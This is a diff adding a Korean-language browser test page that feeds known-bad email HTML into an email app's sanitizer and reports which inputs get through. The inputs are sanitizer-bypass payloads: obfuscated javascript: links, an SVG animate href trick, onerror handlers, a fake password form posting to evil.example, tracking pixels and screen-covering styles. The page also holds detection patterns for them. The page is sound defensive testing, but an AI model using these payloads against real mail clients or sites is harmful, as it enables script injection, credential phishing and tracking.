@@ -1,0 +1,139 @@
+<!doctype html>
+<html lang="ko"><head><meta charset="utf-8">
+<title>푸른 메일 — 본문 정화 뚫어 보기</title>
+<style>
+  body{font-family:'Malgun Gothic','맑은 고딕',sans-serif;margin:0;padding:22px;background:#f6f7f9;color:#222}
+  h1{font-size:19px;margin:0 0 4px}
+  .sub{color:#6b6f76;font-size:13px;margin-bottom:16px;line-height:1.7}
+  .sum{padding:12px 14px;border-radius:8px;font-size:15px;font-weight:700;margin-bottom:14px}
+  .sum.ok{background:#e9f7ee;color:#166534;border:1px solid #a7e0bd}
+  .sum.no{background:#fdeaea;color:#991b1b;border:1px solid #f3b6b6}
+  table{border-collapse:collapse;width:100%;background:#fff;font-size:12.5px}
+  th,td{border:1px solid #e6e8ec;padding:7px 9px;text-align:left;vertical-align:top}
+  th{background:#f2f4f7;font-size:12px}
+  td.v{width:78px;font-weight:700;text-align:center}
+  td.v.ok{color:#166534;background:#f3fbf6}
+  td.v.no{color:#991b1b;background:#fef4f4}
+  code{font-family:Consolas,monospace;font-size:11.5px;color:#444;word-break:break-all}
+  .why{color:#7a7f87;font-size:11.5px;margin-top:3px;line-height:1.55}
+</style></head><body>
+<h1>푸른 메일 — 본문 정화 뚫어 보기</h1>
+<div class="sub">
+  <b>왜 이 화면이 따로 있나.</b> 본문 정화는 <b>브라우저 파서</b>로 남의 HTML 을 읽어 들인 뒤
+  나무를 훑는다. node 검사에는 그 파서가 없어 «판정하는 값»(주소·모양 속성·허락 목록)까지만
+  볼 수 있다. 나무를 훑는 일 자체는 여기서 <b>진짜 브라우저로</b> 확인한다.<br>
+  ⚠ 2026-08-27 이전에는 «위험한 것을 하나씩 지우는» 방식이었고, 아래 시험 여섯 가지가
+  <b>모두 뚫렸다</b>. 지금은 «허락한 것만 남긴다».
+</div>
+<div id="sum" class="sum">pu-cards.html 을 읽는 중…</div>
+<table id="t"><thead><tr>
+  <th style="width:230px">무엇을 넣나</th><th>정화 뒤에 남은 것</th><th class="v">판정</th>
+</tr></thead><tbody></tbody></table>
+
+<script>
+/* pu-cards.html 에서 «진짜 쓰는» 정화 코드만 잘라 온다.
+   여기에 코드를 베껴 두면 앱을 고쳤을 때 이 화면은 옛 코드를 지키게 된다. */
+const CUT_FROM = 'const MB_TAG_KILL';
+const CUT_TO   = '/* 「그림 보기」';
+
+const SHOTS = [
+  ['그냥 스크립트', '<p>안녕</p><script>window.__hit=1<\/script>',
+   'script 는 통째로 버린다'],
+  ['이벤트 속성', '<img src=x onerror="window.__hit=1">',
+   '허락 목록에 없는 속성이라 남지 않는다'],
+  ['★ 실체로 감춘 javascript:', '<a href="&#106;avascript:alert(1)">누르세요</a>',
+   '브라우저가 실체를 푼 뒤에 보므로 감출 데가 없다'],
+  ['★ 탭 끼운 javascript:', '<a href="jav&#x09;ascript:alert(1)">누르세요</a>',
+   '허락한 방식(http·mailto·tel)이 아니면 다 막는다'],
+  ['★ svg animate 로 href 바꾸기',
+   '<svg><a><animate attributeName="href" values="javascript:alert(1)"/><text>누르세요</text></a></svg>',
+   'svg 는 통째로 버린다'],
+  ['★ style 꼬리표', '<style>body{display:none}</style><p>글</p>',
+   'style 을 남기면 화면을 덮어 우리 단추를 가릴 수 있다'],
+  ['★ 바깥 그림(열람 추적)', '<img src="https://track.example/p.gif?id=42">',
+   '주소를 data-src 로 옮겨 두고 부르지 않는다 — 「그림 보기」를 눌러야 부른다'],
+  ['★ 가짜 입력창(form)', '<form action="https://evil.example/x"><input name=pw type=password></form>',
+   'form·input 은 통째로 버린다 — 앱 안의 가짜 로그인 창을 막는다'],
+  ['★ 모양으로 부르는 그림', '<div style="background-image:url(https://track.example/p.gif)">글</div>',
+   'url( 이 든 모양 속성은 걷는다'],
+  ['★ 화면 덮기', '<div style="position:fixed;top:0;left:0;z-index:99999">덮개</div>',
+   'position·z-index 는 걷는다'],
+  ['★ 우리 앱 주소 가리키기', '<a href="/enter.html?x=1">우리 것인 척</a>',
+   '메일이 우리 화면의 다른 자리를 가리키면 사람은 그것을 우리 것으로 읽는다'],
+  ['본문 글은 남아야 한다', '<p>계약서 <b>검토</b> 부탁드립니다</p><o:p>워드 꼬리표</o:p>',
+   '모르는 꼬리표는 껍데기만 벗긴다 — 통째로 버리면 본문이 빈다'],
+  ['표는 남아야 한다', '<table border="1"><tr><td colspan="2" bgcolor="#eee">칸</td></tr></table>',
+   '모양에 쓰는 속성까지 지우면 표가 무너져 보인다'],
+  ['박아 넣은 그림은 보여야 한다',
+   '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUg==">',
+   '서명 로고 등은 바깥을 안 부르므로 그대로 둔다'],
+];
+
+/* 정화 결과가 «정말 안전한가» — 브라우저가 읽는 눈으로 본다 */
+function judge(name, out){
+  const d = document.createElement('div');
+  d.innerHTML = out;                       /* 여기서는 script 가 돌지 않는다(innerHTML) */
+  const bad = [];
+  if(/<\s*(script|style|iframe|object|embed|form|input|svg|math|link|meta|base)\b/i.test(out))
+    bad.push('위험한 꼬리표가 남음');
+  d.querySelectorAll('*').forEach(el=>{
+    /* ⚠ 속성에 적힌 «글자»가 아니라 브라우저가 «실제로 가는 곳»을 본다.
+       jav<탭>ascript: 처럼 끼워 넣은 것은 글자로는 안 보이지만 눌리면 실행된다.
+       el.href 는 브라우저가 푼 뒤의 값이라 감출 데가 없다. */
+    if(el.tagName==='A' && el.hasAttribute('href')){
+      const real = String(el.href||'');
+      if(/^\s*(javascript|vbscript|data:text|about):/i.test(real)) bad.push('눌리면 가는 곳이 위험함');
+    }
+    [...el.attributes].forEach(a=>{
+      if(/^on/i.test(a.name)) bad.push('이벤트 속성 ' + a.name);
+      const v = String(a.value||'');
+      if(/^(href|src)$/i.test(a.name)){
+        /* 브라우저가 푼 값으로 본다 — 이것이 실제로 눌렸을 때 가는 곳이다 */
+        if(/^\s*(javascript|vbscript|data:text|about):/i.test(v)) bad.push('위험한 주소 ' + a.name);
+        if(a.name.toLowerCase()==='src' && /^https?:/i.test(v)) bad.push('바깥 그림을 그대로 부름');
+        if(a.name.toLowerCase()==='href' && /^[\/#]/.test(v)) bad.push('우리 앱 주소를 가리킴');
+      }
+      if(a.name.toLowerCase()==='style' && /url\s*\(|position\s*:|z-index\s*:/i.test(v))
+        bad.push('모양 속성이 위험함');
+    });
+  });
+  /* 남아야 하는 것 */
+  if(name.indexOf('본문 글은') === 0 && out.indexOf('검토') < 0) bad.push('본문 글이 사라짐');
+  if(name.indexOf('표는') === 0 && !/colspan/i.test(out)) bad.push('표 모양이 사라짐');
+  if(name.indexOf('박아 넣은') === 0 && !/src="data:image/i.test(out)) bad.push('박아 넣은 그림이 막힘');
+  return bad;
+}
+
+fetch('../../pu-cards.html').then(r=>r.text()).then(src=>{
+  const i = src.indexOf(CUT_FROM), j = src.indexOf(CUT_TO, i);
+  if(i < 0 || j < 0) throw new Error('pu-cards.html 에서 정화 코드를 찾지 못했습니다 — 이름이 바뀌었나요?');
+  /* 앱의 코드를 그대로 쓴다(state 는 안 쓴다) */
+  const fn = new Function(src.slice(i, j) + '\nreturn { mbCleanHtml, mbSafeUrl, mbStyleClean, hold: () => _mbImgHold };');
+  const M = fn();
+  const tb = document.querySelector('#t tbody');
+  let bad = 0;
+  SHOTS.forEach(([name, html, why])=>{
+    let out = '', errs = [];
+    try{ out = M.mbCleanHtml(html, false); errs = judge(name, out); }
+    catch(e){ errs = ['터졌습니다: ' + e.message]; }
+    if(errs.length) bad++;
+    const tr = document.createElement('tr');
+    tr.innerHTML = '<td><b>' + name + '</b><div class="why">' + why + '</div>'
+      + '<div class="why"><code>' + html.replace(/[&<>]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[c])).slice(0,110) + '</code></div></td>'
+      + '<td><code>' + (out||'(아무것도 안 남음)').replace(/[&<>]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[c])).slice(0,220) + '</code>'
+      + (errs.length ? '<div class="why" style="color:#991b1b">' + errs.join(' · ') + '</div>' : '') + '</td>'
+      + '<td class="v ' + (errs.length?'no':'ok') + '">' + (errs.length?'뚫림':'막힘') + '</td>';
+    tb.appendChild(tr);
+  });
+  const s = document.getElementById('sum');
+  s.className = 'sum ' + (bad ? 'no' : 'ok');
+  s.textContent = bad ? ('⚠ ' + bad + ' / ' + SHOTS.length + ' 이 뚫렸습니다')
+                      : ('모두 막혔습니다 — ' + SHOTS.length + ' / ' + SHOTS.length);
+  window.__cleanResult = { bad: bad, total: SHOTS.length };
+}).catch(e=>{
+  const s = document.getElementById('sum');
+  s.className = 'sum no'; s.textContent = '읽지 못했습니다 — ' + e.message;
+  window.__cleanResult = { bad: -1, err: e.message };
+});
+</script>
+</body></html>
